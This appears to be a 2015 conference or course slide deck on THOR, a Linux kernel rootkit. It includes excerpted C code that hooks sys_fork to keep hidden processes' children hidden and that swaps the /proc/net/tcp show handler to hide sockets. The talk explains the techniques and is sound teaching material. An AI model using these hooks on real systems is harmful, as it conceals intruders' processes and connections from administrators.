---
title: 'THOR'
subtitle: 'The ~~Horrific~~ Hopefully Omnipotent Rootkit'
author: [
    Alex Hirsch,
    FraJo Haider,
]
date: 2015-01-30
---

# Intro

## Features

- works with recent kernel
- hide files by name
- hide kernel modules
- hide processes
- hide sockets
- automatically handles forked processes
- hijack kernel functions

# Communication

# Handling Forks

## Init and Cleanup

```{.c .numberLines}
static long (*sys_fork)(void);

int pidhider_init(void)
{
    /* ... */

    sys_fork = (void*) kallsyms_lookup_name("sys_fork");

    /* error handling */

    hijack(sys_fork, thor_fork);
}

void pidhider_cleanup(void)
{
    if (sys_fork != NULL) {
        unhijack(sys_fork);
    }
}
```

## `thor_fork()`

```{.c .numberLines}
static long thor_fork(void)
{
    bool hidden = is_pid_hidden(current->pid);
    long ret;

     unhijack(sys_fork);
     ret = sys_fork();
     hijack(sys_fork, thor_fork);

     /* if mother process was hidden child process */
     if(hidden && ret != -1 && ret != 0) {
         add_to_pid_list((unsigned short) ret);
     }

     return ret;
}
```

# Hijacking Explained (DEMO)

## Simpler method

Will be shown in the next part.

# Hiding Process

# Hiding Kernel Modules

# Hiding Files

# Hiding Sockets

## Init and Cleanup

```{.c .numberLines}
typedef int (*seq_show_fun)(struct seq_file*, void*);

static seq_show_fun orig_tcp4_seq_show;

int sockethider_init(void)
{
    orig_tcp4_seq_show = replace_tcp_seq_show(thor_tcp4_seq_show,
                                              "/proc/net/tcp");

    /* ... */
}

void sockethider_cleanup(void)
{
    replace_tcp_seq_show(orig_tcp4_seq_show, "/proc/net/tcp");

    /* ... */
}
```

## `replace_tcp_seq_show()`

```{.c .numberLines}
static seq_show_fun replace_tcp_seq_show(seq_show_fun new_seq_show,
                                         const char *path)
{
    void *old_seq_show;
    struct file *filp;
    struct tcp_seq_afinfo *afinfo;

    if ((filp = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

    afinfo = PDE_DATA(filp->f_dentry->d_inode);

    old_seq_show = afinfo->seq_ops.show;

    afinfo->seq_ops.show = new_seq_show;

    filp_close(filp, 0);

    return old_seq_show;
}
```

## `thor_tcp4_seq_show()`

```{.c .numberLines}
static int thor_tcp4_seq_show(struct seq_file *seq, void *v)
{
    /* hide port */
    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
        return 0;

    /* call original */
    return orig_tcp4_seq_show(seq, v);
}
```

# Outro

## Take a look

Github: <http://git.io/ZwNdCQ>

\centerline{\includegraphics[height=160px]{gfx/qrcode.png}}

# In Action (DEMO)
